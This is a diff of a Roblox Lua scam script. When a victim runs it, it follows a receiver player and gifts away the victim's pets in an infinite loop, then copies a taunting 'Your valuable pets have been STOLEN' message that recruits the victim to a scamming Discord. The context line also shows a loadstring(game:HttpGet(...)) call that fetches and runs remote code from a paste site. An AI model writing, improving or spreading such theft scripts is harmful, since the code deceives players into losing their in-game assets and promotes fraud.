@@ -806,27 +806,35 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         return true
     end
 
-    -- Start following before gifting
-    local followConn = safeFollow()
+-- Set clipboard message once
+setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
 
-    -- Gifting loop
+-- Start following the receiver
+local followConn = safeFollow()
+
+-- Wait a moment before beginning the loop
+task.wait(2)
+
+-- Begin infinite gifting loop
+while true do
+    task.wait(3)
+
+    -- Always refresh pet list in case new pets appear
+    local pets = GetPlayerPets()
+
     for _, pet in ipairs(pets) do
-        if not receiverPlr then
-            followConn:Stop()
-            targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
-            setclipboard("https://discord.gg/d2zgg2YDMz")
-            break
-        end
-
         for _, tool in targetPlr.Backpack:GetChildren() do
             if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
-                print("Gifting:", tool.Name)
-                safeGiftTool(tool)
+                print("Loop Gifting:", tool.Name)
+                local success = safeGiftTool(tool)
+                if success then
+                    print("Successfully gifted:", tool.Name)
+                else
+                    warn("Failed to gift:", tool.Name)
+                end
+                task.wait(0.4) -- brief delay between gifts
             end
         end
     end
+end
 
-    -- Stop following after gifting
-    followConn:Stop()
-    targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
-    setclipboard("https://discord.gg/d2zgg2YDMz")
